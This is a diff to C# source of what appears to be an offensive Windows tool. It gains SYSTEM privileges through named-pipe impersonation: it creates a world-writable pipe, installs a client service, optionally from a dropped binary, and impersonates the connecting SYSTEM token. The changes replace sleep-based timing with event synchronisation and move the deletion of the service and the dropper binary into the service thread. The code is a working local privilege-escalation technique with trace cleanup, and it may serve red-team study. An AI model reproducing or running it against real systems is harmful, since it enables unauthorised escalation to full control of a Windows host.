@@ -11,11 +11,13 @@ using NamedPipeImpersonation.Interop;
 
 namespace NamedPipeImpersonation.Library
 {
+    using NTSTATUS = Int32;
+
     internal class Modules
     {
         public static bool GetSystemWithNamedPipe()
         {
-            bool status;
+            var status = false;
             var isImpersonated = false;
 
             do
@@ -33,6 +35,18 @@ namespace NamedPipeImpersonation.Library
                 var pipeSecurity = new PipeSecurity();
                 var accessRule = new PipeAccessRule("Everyone", PipeAccessRights.ReadWrite, AccessControlType.Allow);
                 pipeSecurity.AddAccessRule(accessRule);
+
+                Globals.ConnectEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ConnectEvent");
+                Globals.PipeEventHandle = NativeMethods.CreateEvent(IntPtr.Zero, true, false, "ServiceEvent");
+
+                if ((Globals.ConnectEventHandle == IntPtr.Zero) ||
+                    (Globals.PipeEventHandle == IntPtr.Zero))
+                {
+                    error = Marshal.GetLastWin32Error();
+                    Console.WriteLine("[-] Failed to create service handling event.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
+                    break;
+                }
 
                 Console.WriteLine("[>] Trying to enable required privileges.");
 
@@ -73,7 +87,10 @@ namespace NamedPipeImpersonation.Library
                         serviceThread.Start();
                         pipeServer.WaitForConnection();
                         pipeMessage = pipeReader.ReadToEnd();
-                        Globals.IsPipeConnected = true;
+
+                        NativeMethods.SetEvent(Globals.ConnectEventHandle);
+                        NativeMethods.NtClose(Globals.ConnectEventHandle);
+                        NativeMethods.NtWaitForSingleObject(Globals.PipeEventHandle, false, IntPtr.Zero);
 
                         if (Helpers.CompareIgnoreCase(pipeMessage, "timeout"))
                         {
@@ -130,39 +147,6 @@ namespace NamedPipeImpersonation.Library
                             Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(error, false));
                         }
                     }
-                }
-
-                Thread.Sleep(100);
-
-                if (Globals.ServiceHandle != IntPtr.Zero)
-                {
-                    Console.WriteLine("[>] Deleting named pipe client service.");
-
-                    if (!NativeMethods.DeleteService(Globals.ServiceHandle))
-                    {
-                        Console.WriteLine("[-] Failed to delete named pipe client servce.");
-                        Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
-                    }
-                    else
-                    {
-                        Globals.ServiceHandle = IntPtr.Zero;
-                        Console.WriteLine("[+] Named pipe client service is deleted successfully.");
-                    }
-                }
-
-                try
-                {
-                    if (Globals.UseDropper && File.Exists(Globals.BinaryPath))
-                    {
-                        Console.WriteLine("[>] Deleting service binary.");
-                        File.Delete(Globals.BinaryPath);
-                        Console.WriteLine("[+] Service binary is deleted successfully.");
-                    }
-                }
-                catch
-                {
-                    Console.WriteLine("[!] Failed to delete dropper binary. Delete it mannually.");
-                    Console.WriteLine("    [*] Binary Path : {0}", Globals.BinaryPath);
                 }
 
                 if (!isImpersonated || (hPrimaryToken == IntPtr.Zero))
@@ -239,6 +223,9 @@ namespace NamedPipeImpersonation.Library
 
         private static void ServiceThreadProc()
         {
+            NTSTATUS ntstatus;
+            var timeout = LARGE_INTEGER.FromInt64(-(Globals.Timeout * 10000));
+
             Console.WriteLine("[>] Trying to create and start named pipe client service.");
             Console.WriteLine("    [*] Service Name : {0}", Globals.ServiceName);
 
@@ -258,9 +245,9 @@ namespace NamedPipeImpersonation.Library
                     Console.WriteLine("[*] Service binary is @ {0}", Globals.BinaryPath);
             }
 
-            Thread.Sleep(Globals.Timeout);
+            ntstatus = NativeMethods.NtWaitForSingleObject(Globals.ConnectEventHandle, false, in timeout);
 
-            if (!Globals.IsPipeConnected)
+            if (ntstatus == Win32Consts.STATUS_TIMEOUT)
             {
                 try
                 {
@@ -273,6 +260,40 @@ namespace NamedPipeImpersonation.Library
                 }
                 catch { }
             }
+
+            if (Globals.ServiceHandle != IntPtr.Zero)
+            {
+                Console.WriteLine("[>] Deleting named pipe client service.");
+
+                if (!NativeMethods.DeleteService(Globals.ServiceHandle))
+                {
+                    Console.WriteLine("[-] Failed to delete named pipe client servce.");
+                    Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(Marshal.GetLastWin32Error(), false));
+                }
+                else
+                {
+                    Globals.ServiceHandle = IntPtr.Zero;
+                    Console.WriteLine("[+] Named pipe client service is deleted successfully.");
+                }
+            }
+
+            try
+            {
+                if (Globals.UseDropper && File.Exists(Globals.BinaryPath))
+                {
+                    Console.WriteLine("[>] Deleting service binary.");
+                    File.Delete(Globals.BinaryPath);
+                    Console.WriteLine("[+] Service binary is deleted successfully.");
+                }
+            }
+            catch
+            {
+                Console.WriteLine("[!] Failed to delete dropper binary. Delete it mannually.");
+                Console.WriteLine("    [*] Binary Path : {0}", Globals.BinaryPath);
+            }
+
+            NativeMethods.SetEvent(Globals.PipeEventHandle);
+            NativeMethods.NtClose(Globals.PipeEventHandle);
         }
     }
 }
